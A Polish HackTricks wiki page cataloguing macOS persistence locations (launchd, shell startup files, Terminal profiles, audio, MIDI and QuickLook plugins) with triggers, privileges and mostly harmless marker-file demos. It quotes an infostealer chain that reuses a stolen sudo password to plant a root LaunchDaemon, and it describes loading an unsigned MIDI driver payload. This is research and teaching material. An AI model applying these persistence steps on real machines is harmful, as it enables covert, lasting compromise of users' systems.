# macOS Auto Start

{{#include ../banners/hacktricks-training.md}}

Ta sekcja w dużej mierze opiera się na serii wpisów na blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Jej celem jest wskazanie lokalizacji, w których zapis pliku może doprowadzić do późniejszego wykonania kodu, zdarzenia wyzwalającego wykonanie oraz wymaganych uprawnień. Sama obecność lokalizacji nie dowodzi, że dany mechanizm jest włączony. Opisane poniżej lokalne kontrole przeprowadzono w systemie macOS 26.5.2 (5 października 2026 r.); nie potwierdzają one, że zachowanie będzie takie samo we wszystkich wersjach macOS.

> [!NOTE]
> „Wyzwalane zapisem” nie zawsze oznacza „uruchamiane natychmiast po zapisie”. Niektóre lokalizacje są odczytywane tylko podczas logowania, uruchamiania określonej aplikacji lub wykonywania przez użytkownika danej czynności. Możliwość zapisu ładunku w już skonfigurowanym zadaniu różni się też od uprawnienia do zarejestrowania nowego zadania. Zanim skorzystasz z danej techniki, przetestuj ją na koncie testowym lub maszynie wirtualnej.

## Sandbox Bypass

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **sandbox bypass**, które pozwalają po prostu wykonać coś przez **zapisanie tego w pliku** i **zaczekanie** na bardzo **powszechną** **czynność**, określony **czas** albo **czynność, którą zwykle możesz wykonać** z poziomu sandboxa bez uprawnień root.

### Launchd

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`/Library/LaunchAgents`**
  - **Wyzwalacz**: logowanie użytkownika (lub jawna rejestracja)
  - Wymagane uprawnienia root
- **`/Library/LaunchDaemons`**
  - **Wyzwalacz**: uruchomienie systemu (lub jawna rejestracja)
  - Wymagane uprawnienia root
- **`/System/Library/LaunchAgents`**
  - **Wyzwalacz**: logowanie użytkownika; chroniona lokalizacja systemowa Apple
- **`/System/Library/LaunchDaemons`**
  - **Wyzwalacz**: uruchomienie systemu; chroniona lokalizacja systemowa Apple
- **`~/Library/LaunchAgents`**
  - **Wyzwalacz**: ponowne logowanie

`launchd` nie skanuje lokalizacji `~/Library/LaunchDaemons`. Zadania użytkownika należą do `~/Library/LaunchAgents`; systemowy katalog daemonów to `/Library/LaunchDaemons`. [Przewodnik Apple dotyczący uruchamiania launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) opisuje skanowane lokalizacje.

> [!TIP]
> Ciekawostka: **`launchd`** ma wbudowaną listę property list w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, jakie launchd musi uruchomić. Co więcej, usługi te mogą zawierać klucze `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, które oznaczają, że muszą zostać uruchomione i zakończyć działanie powodzeniem.
>
> Oczywiście nie można ich zmodyfikować z powodu podpisywania kodu.

#### Opis i wykorzystanie

**`launchd`** to **pierwszy** **proces** uruchamiany przez jądro OX S podczas startu systemu i ostatni, który kończy działanie przy jego zamykaniu. Powinien zawsze mieć **PID 1**. Ten proces **odczytuje i wykonuje** konfiguracje wskazane w **plistach** **ASEP** w lokalizacjach:

- `/Library/LaunchAgents`: agenty poszczególnych użytkowników zainstalowane przez administratora
- `/Library/LaunchDaemons`: demony systemowe zainstalowane przez administratora
- `/System/Library/LaunchAgents`: agenty poszczególnych użytkowników dostarczane przez Apple.
- `/System/Library/LaunchDaemons`: demony systemowe dostarczane przez Apple.

Gdy użytkownik się loguje, `launchd` ładuje pliki plist z katalogu `~/Library/LaunchAgents` tego użytkownika, korzystając z jego uprawnień. Zadania są uruchamiane zgodnie z zawartymi w nich kluczami; samo załadowanie pliku plist nie oznacza, że proces zostanie uruchomiony natychmiast.

**Główna różnica między agentami a daemonami polega na tym, że agenty są ładowane po zalogowaniu użytkownika, a demony podczas uruchamiania systemu** (ponieważ istnieją usługi, takie jak ssh, które muszą zostać uruchomione, zanim jakikolwiek użytkownik uzyska dostęp do systemu). Agenty mogą też korzystać z GUI, podczas gdy demony muszą działać w tle.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Każdy element `ProgramArguments` jest osobnym argumentem; `launchd` nie interpretuje pojedynczego ciągu znaków jako polecenia powłoki. Poprawiony przykład powyżej można sprawdzić pod kątem składni bez jego ładowania, używając `plutil -lint /path/to/example.plist`. Więcej informacji o `ProgramArguments`, `RunAtLoad` i `KeepAlive` znajdziesz w lokalnej stronie podręcznika `man launchd.plist`.

#### Wyzwalacze zdarzeń plikowych w istniejących zadaniach

**Już załadowany** agent lub daemon może używać `WatchPaths`, aby uruchamiać się po zmianie wskazanej ścieżki. `QueueDirectories` uruchamia zadanie, gdy katalog nie jest pusty; `StartOnMount` uruchamia je po zamontowaniu woluminu. [Przewodnik Apple dotyczący launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) zawiera przykłady użycia `WatchPaths` i `QueueDirectories`. Zapis do obserwowanego pliku wyzwala **już skonfigurowane zadanie**; umożliwia dowolne wykonanie kodu tylko wtedy, gdy zapisujący może też kontrolować plik wykonywalny zadania, skrypt lub dane interpretowane przez to zadanie. Samo zapisanie nowego pliku plist poza skanowaną lub zarejestrowaną lokalizacją nie powoduje jego załadowania.

Ten samoczyszczący się PoC rejestruje **tymczasowego agenta użytkownika** o unikalnej nazwie, zmienia tylko własny obserwowany plik i usuwa agenta. Został pomyślnie uruchomiony w systemie macOS 26.5.2 bez wylogowania ani ponownego uruchomienia:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Lokalne uruchomienie wypisało `watch fired: True`, a `bootout` zakończyło się powodzeniem. `launchctl bootstrap` jest tu używane wyłącznie w ramach odizolowanego PoC; **nie jest** potrzebne w przypadku joba, który jest już załadowany. Aby bezpiecznie sprawdzić istniejący job, odczytaj jego plist oraz rozwiązaną ścieżkę `ProgramArguments`, a następnie sprawdź, czy można zapisywać do odpowiedniego pliku wykonywalnego lub interpretowanego, nie modyfikując go.

Zdarza się, że **agent musi zostać uruchomiony przed zalogowaniem użytkownika**; takie agenty nazywa się **PreLoginAgents**. Przydają się na przykład do zapewnienia technologii wspomagających dostępność podczas logowania. Można je znaleźć również w `/Library/LaunchAgents` (przykład znajduje się [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)).

> [!TIP]
> Nowe pliki konfiguracyjne Daemonów lub Agentów zostaną **załadowane po następnym restarcie albo za pomocą** `launchctl load <target.plist>`. Można **również załadować pliki .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak te pliki plist nie zostaną automatycznie załadowane po restarcie).\
> Można je też **wyładować** za pomocą `launchctl unload <target.plist>` (wskazany przez nie proces zostanie zakończony),
>
> Aby **upewnić się**, że **nic** (na przykład override) **nie uniemożliwia** **uruchomienia** **Agenta** lub **Daemona**, uruchom: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Wyświetl wszystkie agenty i daemony załadowane przez bieżącego użytkownika:

```bash
launchctl list
```

#### Przykładowy łańcuch złośliwego LaunchDaemon (ponowne użycie hasła)

Niedawny infostealer na macOS ponownie wykorzystał **przechwycone hasło sudo**, aby zainstalować agenta użytkownika i LaunchDaemon działający jako root:<sup>[[1]](#references)</sup>

- Zapisz pętlę agenta w `~/.agent` i nadaj jej uprawnienia do wykonywania.
- Wygeneruj plik plist w `/tmp/starter`, wskazujący na tego agenta.
- Ponownie użyj skradzionego hasła z `sudo -S`, aby skopiować plik do `/Library/LaunchDaemons/com.finder.helper.plist`, ustawić właściciela i grupę na `root:wheel` oraz załadować go poleceniem `launchctl load`.
- Uruchom agenta po cichu za pomocą `nohup ~/.agent >/dev/null 2>&1 &`, aby odłączyć wyjście.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Plik plist demona umieszczony w `/Library/LaunchDaemons` nie staje się bezpieczny przez nadanie mu własności użytkownika. `launchd` wymaga odpowiedniej własności i uprawnień dla zadań systemowych i może odrzucić niezabezpieczony plik plist. Demon należący do roota zwykle działa jako root, chyba że jego konfiguracja wskazuje inne konto. Sprawdź `UserName`, `GroupName`, własność i diagnostykę `launchctl`; nie wyciągaj wniosków o tożsamości procesu wyłącznie na podstawie nazwy właściciela pliku plist.

#### Więcej informacji o launchd

**`launchd`** to **pierwszy** proces w trybie użytkownika uruchamiany przez **kernel**. Uruchomienie procesu musi zakończyć się **powodzeniem**, a proces **nie może zakończyć działania ani ulec awarii**. Jest nawet **chroniony** przed niektórymi **sygnałami zabijającymi proces**.

Jedną z pierwszych rzeczy, które zrobi `launchd`, jest **uruchomienie** wszystkich **daemonów**, takich jak:

- **Daemony timerów** uruchamiane o określonej porze:
  - `com.apple.atrun.plist` wywołuje `/usr/libexec/atrun` z `StartInterval = 30` sekund w macOS 26.5.2; jego efektywny stan włączenia może różnić się od wartości klucza `Disabled` w pliku plist, ponieważ launchd przechowuje nadpisania osobno.
  - `com.vix.cron.plist` wywołuje `/usr/sbin/cron`, gdy `/usr/lib/cron/tabs` zawiera zadania. `com.apple.systemstats.daily` to inna zaplanowana usługa, a nie daemon cron.
- **Daemony sieciowe**, takie jak:
  - `org.cups.cups-lpd`: Nasłuchuje przez TCP (`SockType: stream`) z `SockServiceName: printer`
    - SockServiceName musi być portem lub usługą z `/etc/services`
  - `com.apple.xscertd.plist`: Nasłuchuje przez TCP na porcie 1640
- **Daemony ścieżek**, które są uruchamiane po zmianie wskazanej ścieżki:
  - `com.apple.postfix.master`: Monitoruje ścieżkę `/etc/postfix/aliases`
- **Daemony powiadomień IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: Wpis `MachServices` wskazuje nazwę `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Różni się od poprzedniego mechanizmu. Powoduje, że launchd uruchamia aplikacje w odpowiedzi na określone zdarzenie. W tym przypadku głównym używanym plikiem binarnym nie jest jednak `launchd`, lecz `/usr/libexec/UserEventAgent`. Ładuje on wtyczki z folderu objętego ograniczeniami SIP /System/Library/UserEventPlugins/, gdzie każda wtyczka określa swój inicjalizator w kluczu `XPCEventModuleInitializer` lub, w przypadku starszych wtyczek, w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w pliku `Info.plist`.

### Pliki startowe powłoki

Opis: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Opis (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Musisz jednak znaleźć aplikację z TCC bypass, która uruchamia powłokę wczytującą te pliki

#### Lokalizacje

- **`~/.zshenv`** (lub nowszy skompilowany plik **`~/.zshenv.zwc`**)
  - **Wyzwalacz**: Każde zwykłe wywołanie zsh, w tym nieinteraktywne `zsh -c`; `zsh -f` pomija pliki startowe użytkownika.
- **`~/.zshrc`**
  - **Wyzwalacz**: Uruchomienie interaktywnego zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Wyzwalacz**: Uruchomienie logowania zsh; są wczytywane odpowiednio przed i po `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Wyzwalacz**: Otwarcie terminala z zsh
  - Wymagany root
- **`~/.zlogout`**
  - **Wyzwalacz**: Normalne zakończenie logowania zsh, a nie zamknięcie dowolnego terminala lub powłoki.
- **`/etc/zlogout`**
  - **Wyzwalacz**: Zamknięcie terminala z zsh
  - Wymagany root
- Potencjalnie więcej informacji w: **`man zsh`**
- **`~/.bashrc`**
  - **Wyzwalacz**: Uruchomienie interaktywnego **niezalogowanego** Bash. Interaktywny Bash w trybie logowania wczytuje ten plik tylko wtedy, gdy plik logowania jawnie go dołącza.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Wyzwalacz**: Uruchomienie logowania Bash; uruchamiany jest pierwszy dostępny do odczytu plik w tej kolejności. `~/.profile` jest pomijany, jeśli istnieje którykolwiek z dwóch wcześniejszych plików.
- **`/etc/profile`**
  - **Wyzwalacz**: Uruchomienie logowania Bash; zmiana tego pliku wymaga roota.
- **`~/.tcshrc`** lub, jeśli go nie ma, **`~/.cshrc`**
  - **Wyzwalacz**: Uruchomienie `tcsh`, również nieinteraktywnego `tcsh -c` na tym Macu. Użytkownik musi faktycznie uruchomić `tcsh`; nie jest to domyślna powłoka macOS.
- **`~/.login`**
  - **Wyzwalacz**: Uruchomienie logowania `tcsh` po jego pliku rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Wyzwalacz**: Oczekuje się, że zostaną uruchomione przez xterm, ale **nie jest on zainstalowany**, a nawet po instalacji pojawia się ten błąd: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Opis i wykorzystanie

Podczas uruchamiania środowiska powłoki, takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. Obecnie macOS używa `/bin/zsh` jako domyślnej powłoki. To, czy Terminal lub SSH uruchamia powłokę logowania czy interaktywną, zależy od ich konfiguracji; nie zakładaj, że każda z powyższych sesji uruchamia wszystkie pliki. Chociaż `bash` i `sh` są również dostępne w macOS, trzeba je jawnie wywołać, aby z nich korzystać.<sup>[[2]](#references)</sup> [Dokumentacja plików startowych zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) opisuje kolejność, nadpisanie `ZDOTDIR` oraz regułę `.zwc`.

Poniższy eksperyment tylko do odczytu używał jednorazowego `ZDOTDIR` w macOS 26.5.2. Pokazuje, które pliki użytkownika zostały wczytane; żaden rzeczywisty plik startowy powłoki nie został zmieniony:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Zaobserwowana kolejność była następująca: `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` musi już wskazywać alternatywny katalog; samo zapisanie plików w dowolnym katalogu nie wystarczy.

[Dokumentacja startowa Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) rozróżnia powłoki loginowe i interaktywne. Na maszynie testowej z macOS 26.5.2 izolowany `HOME` zawierający wszystkie cztery pliki startowe użytkownika dał następujące wyniki: `bash -c` → brak, `bash -ic` → `.bashrc`, `bash -lc` i `bash -lic` → tylko `.bash_profile`. Usunięcie `.bash_profile` sprawiło, że login Bash wczytał `.bash_login`, a następnie `.profile`, gdy usunięto również ten plik. `BASH_ENV` może wskazywać plik dla nieinteraktywnego Bash, ale ta zmienna środowiskowa musi być już ustawiona w procesie wywołującym. Jawne `exit` z login Bash może również wczytać `~/.bash_logout`.

Lokalna instrukcja `tcsh(1)` opisuje osobną kolejność plików startowych. Przy użyciu tymczasowego `HOME` polecenie `/bin/tcsh -c :` wczytało `.tcshrc` albo `.cshrc`, jeśli nie było pliku `.tcshrc`. Tymczasowa powłoka login `tcsh` wczytała `.tcshrc` i `.login`. W ramach tych testów utworzono i usunięto wyłącznie pliki tymczasowe.

### Ponowne otwieranie aplikacji

> [!CAUTION]
> Skonfigurowanie wskazanego mechanizmu, wylogowanie się i ponowne zalogowanie, a nawet ponowne uruchomienie komputera nie spowodowało uruchomienia aplikacji podczas testów. Aplikacja może musieć być uruchomiona w chwili wykonywania tych czynności.

**Opis**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Wyzwalacz**: Ponowne uruchomienie powoduje ponowne otwarcie aplikacji

#### Opis i wykorzystanie

Wszystkie aplikacje otwierane ponownie znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Aby ponownie otwierane aplikacje uruchamiały własną aplikację, wystarczy **dodać ją do listy**.

UUID można znaleźć, wyświetlając zawartość tego katalogu lub używając polecenia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić, które aplikacje zostaną ponownie otwarte, możesz wykonać:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Aby **dodać aplikację do tej listy**, możesz użyć:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Preferencje Terminala

Opis: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Przydatne do bypass sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal może mieć uprawnienia FDA użytkownika, który go używa

#### Lokalizacja

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Wyzwalacz**: Otwarcie nowego okna lub karty Terminala z użyciem profilu, którego ustawienia Shell zawierają polecenie startowe

#### Opis i wykorzystanie

W **`~/Library/Preferences`** są przechowywane preferencje użytkownika dotyczące aplikacji. Niektóre z tych preferencji mogą zawierać konfigurację umożliwiającą **wykonywanie innych aplikacji/skryptów**.<sup>[[5]](#references)</sup>

Na przykład Terminal może wykonać polecenie podczas uruchamiania:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w następujący sposób:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Jeśli odpowiedni profil zawiera polecenie startowe, a Terminal odczytuje to ustawienie, nowa sesja korzystająca z tego profilu może je wykonać. [Aktualny przewodnik Apple dotyczący Terminala](https://support.apple.com/guide/terminal/trmlshll/mac) opisuje polecenie dla danego profilu: **Shell → Startup**. Samo otwarcie Terminala bez uruchomienia nowej sesji korzystającej z tego profilu nie wystarczy. Poniższe zmiany ustawień nie zostały wprowadzone na Macu badawczym.

Możesz dodać to z poziomu CLI za pomocą:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Skrypty Terminala / inne rozszerzenia plików

- Przydatne do omijania sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal może używać uprawnień FDA użytkownika

#### Lokalizacja

- **Gdziekolwiek**
  - **Wyzwalacz**: Otwórz plik `.terminal`, `.command` lub `.tool`

#### Opis i wykorzystanie

Jeśli użytkownik otworzy plik ustawień **`.terminal`**, Terminal może utworzyć sesję na podstawie jego profilu; pliki wykonywalne **`.command`** i **`.tool`** również mogą otwierać się w Terminalu. To jawny wyzwalacz otwarcia pliku, a nie wykonanie kodu przez samo otwarcie Terminala. Odziedziczony dostęp TCC zależy od faktycznie przyznanych uprawnień Terminala i wykonywanej operacji. Poniższy historyczny przykład nie został uruchomiony na Macu badawczym.

Wypróbuj:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Można też użyć rozszerzeń **`.command`** i **`.tool`** z zawartością będącą zwykłymi skryptami powłoki — one również zostaną otwarte w Terminalu.

> [!CAUTION]
> Jeśli Terminal ma uprawnienie **Full Disk Access**, będzie mógł wykonać tę czynność (pamiętaj, że wykonane polecenie będzie widoczne w oknie Terminala).

### Wtyczki audio

Opis: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Opis: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- **`/Library/Audio/Plug-Ins/HAL`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: serwer Core Audio ładuje zgodną wtyczkę urządzenia HAL; ponowne uruchomienie serwera może spowodować ponowne wykrycie
- **`/Library/Audio/Plug-ins/Components`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: host audio wykrywa i tworzy instancję zainstalowanego Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Wyzwalacz**: host audio wykrywa i tworzy instancję zainstalowanego Audio Unit
- **`/System/Library/Components`**
  - Lokalizacja dostarczana przez Apple i chroniona przez system
  - **Wyzwalacz**: host audio tworzy instancję pasującego komponentu systemowego

#### Opis

Zgodnie z wcześniejszymi opisami można **skompilować niektóre wtyczki audio** i doprowadzić do ich załadowania.<sup>[[6]](#references)[[7]](#references)</sup>

Wtyczki urządzeń HAL i Audio Units są ładowane na różne sposoby. [Przewodnik Apple dotyczący hostowania Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) informuje, że host musi znaleźć komponent i utworzyć jego instancję; samo skopiowanie go do katalogu skanowania lub ponowne uruchomienie `coreaudiod` nie dowodzi, że kod został wykonany. Wtyczki AUv2 działają w procesie hosta, natomiast [aktualne wytyczne Apple dotyczące Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) informują, że AUv3 domyślnie działa w systemie macOS w osobnym procesie. Wymogi dotyczące podpisu, sandboxa i weryfikacji bibliotek zależą od hosta. Na komputerze Mac użytym do badań nie zainstalowano ani nie uruchomiono żadnej wtyczki audio.

### Sterowniki CoreMIDI (MIDIServer)

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Przydatne do ominięcia sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Twój kod działa wewnątrz procesu `MIDIServer`, a nie w sandboxie Twojej aplikacji
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` działa w ramach własnego profilu sandboxa `seatbelt`

#### Lokalizacja

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Uprawnienia root nie są wymagane (lokalizacja zapisywalna przez użytkownika)
  - **Wyzwalacz**: `MIDIServer` uruchamia się (ponownie). Jest uruchamiany na żądanie, gdy dowolny proces po raz pierwszy korzysta z CoreMIDI (otwarcie *Audio MIDI Setup*, GarageBand, DAW lub strony korzystającej z WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: jak wyżej

#### Opis i wykorzystanie

`MIDIServer` firmy Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) ładuje pakiety **sterowników** MIDI z katalogów `Audio/MIDI Drivers`. Plik binarny jest podpisany przez Apple, ale zawiera uprawnienie `com.apple.security.cs.disable-library-validation`, dzięki czemu ładuje pakiet, który jest **niepodpisany lub podpisany ad hoc przez inny zespół**, umożliwiając wykonanie kodu w osobnym procesie należącym do Apple **bez uprawnień root**.<sup>[[53]](#references)</sup>

Zweryfikowano w macOS 26 (tylko do odczytu):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Sterownik to standardowy bundle eksportujący fabrykę `MIDIDriverInterface`; umieszczenie payloadu w fabryce/konstruktorze sprawia, że uruchamia się on zaraz po wyliczeniu sterowników przez `MIDIServer`. Zbuduj go, umieść jako `~/Library/Audio/MIDI Drivers/Evil.plugin`, a następnie wywołaj jego załadowanie bez wylogowywania się ani ponownego uruchamiania systemu:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Wtyczki QuickLook

Opis: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i wykorzystanie

Wtyczki QuickLook mogą zostać uruchomione, gdy **wyświetlisz podgląd pliku** (naciśnij spację, gdy plik jest zaznaczony w Finderze) i zainstalowana jest **wtyczka obsługująca dany typ pliku**.<sup>[[8]](#references)</sup>

Możesz skompilować własną wtyczkę QuickLook, umieścić ją w jednej z wymienionych wcześniej lokalizacji, aby ją załadować, a następnie przejść do obsługiwanego pliku i nacisnąć spację, aby ją uruchomić.

